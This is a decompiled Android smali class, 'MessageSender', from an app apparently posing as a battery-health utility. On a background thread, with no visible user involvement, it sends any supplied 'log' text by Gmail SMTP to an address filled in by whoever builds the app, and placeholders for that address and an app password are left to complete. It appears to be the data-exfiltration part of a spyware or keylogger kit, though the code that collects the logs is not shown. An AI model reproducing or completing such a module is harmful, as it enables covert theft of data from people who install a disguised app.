.class public Lcom/BatteryHealth/MessageSender;
.super Ljava/lang/Object;
.source "MessageSender.java"


# static fields
.field private static final APP_PASSWORD:Ljava/lang/String; = "APP-PASS"

.field private static final RECIPIENT_EMAIL:Ljava/lang/String; = "YOUR-EMAIL@gmail.com"

.field private static final TAG:Ljava/lang/String; = "MessageSender"

.field private static final USERNAME:Ljava/lang/String; = "YOUR-EMAIL@gmail.com"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method synthetic lambda$sendEmail$0$com-BatteryHealth-MessageSender(Ljava/lang/String;)V
    .locals 6
    .param p1, "log"    # Ljava/lang/String;

    .line 26
    const-string v0, "YOUR-EMAIL@gmail.com"

    const-string v1, "true"

    :try_start_0
    new-instance v2, Ljava/util/Properties;

    invoke-direct {v2}, Ljava/util/Properties;-><init>()V

    .line 27
    .local v2, "props":Ljava/util/Properties;
    const-string v3, "mail.smtp.auth"

    invoke-virtual {v2, v3, v1}, Ljava/util/Properties;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 28
    const-string v3, "mail.smtp.starttls.enable"

    invoke-virtual {v2, v3, v1}, Ljava/util/Properties;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 29
    const-string v1, "mail.smtp.host"

    const-string v3, "smtp.gmail.com"

    invoke-virtual {v2, v1, v3}, Ljava/util/Properties;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 30
    const-string v1, "mail.smtp.port"

    const-string v3, "587"

    invoke-virtual {v2, v1, v3}, Ljava/util/Properties;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 32
    new-instance v1, Lcom/BatteryHealth/MessageSender$1;

    invoke-direct {v1, p0}, Lcom/BatteryHealth/MessageSender$1;-><init>(Lcom/BatteryHealth/MessageSender;)V

    .line 38
    .local v1, "auth":Ljavax/mail/Authenticator;
    invoke-static {v2, v1}, Ljavax/mail/Session;->getInstance(Ljava/util/Properties;Ljavax/mail/Authenticator;)Ljavax/mail/Session;

    move-result-object v3

    .line 40
    .local v3, "session":Ljavax/mail/Session;
    new-instance v4, Ljavax/mail/internet/MimeMessage;

    invoke-direct {v4, v3}, Ljavax/mail/internet/MimeMessage;-><init>(Ljavax/mail/Session;)V

    .line 41
    .local v4, "message":Ljavax/mail/Message;
    new-instance v5, Ljavax/mail/internet/InternetAddress;

    invoke-direct {v5, v0}, Ljavax/mail/internet/InternetAddress;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v5}, Ljavax/mail/Message;->setFrom(Ljavax/mail/Address;)V

    .line 42
    sget-object v5, Ljavax/mail/Message$RecipientType;->TO:Ljavax/mail/Message$RecipientType;

    invoke-static {v0}, Ljavax/mail/internet/InternetAddress;->parse(Ljava/lang/String;)[Ljavax/mail/internet/InternetAddress;

    move-result-object v0

    invoke-virtual {v4, v5, v0}, Ljavax/mail/Message;->setRecipients(Ljavax/mail/Message$RecipientType;[Ljavax/mail/Address;)V

    .line 43
    const-string v0, "Log Report"

    invoke-virtual {v4, v0}, Ljavax/mail/Message;->setSubject(Ljava/lang/String;)V

    .line 44
    invoke-virtual {v4, p1}, Ljavax/mail/Message;->setText(Ljava/lang/String;)V

    .line 46
    invoke-static {v4}, Ljavax/mail/Transport;->send(Ljavax/mail/Message;)V
    :try_end_0
    .catch Ljavax/mail/MessagingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 49
    .end local v1    # "auth":Ljavax/mail/Authenticator;
    .end local v2    # "props":Ljava/util/Properties;
    .end local v3    # "session":Ljavax/mail/Session;
    .end local v4    # "message":Ljavax/mail/Message;
    goto :goto_0

    .line 47
    :catch_0
    move-exception v0

    .line 48
    .local v0, "e":Ljavax/mail/MessagingException;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Failed to send email: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljavax/mail/MessagingException;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "MessageSender"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 50
    .end local v0    # "e":Ljavax/mail/MessagingException;
    :goto_0
    return-void
.end method

.method public sendEmail(Ljava/lang/String;)V
    .locals 2
    .param p1, "log"    # Ljava/lang/String;

    .line 24
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/BatteryHealth/MessageSender$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0, p1}, Lcom/BatteryHealth/MessageSender$$ExternalSyntheticLambda0;-><init>(Lcom/BatteryHealth/MessageSender;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 50
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 51
    return-void
.end method
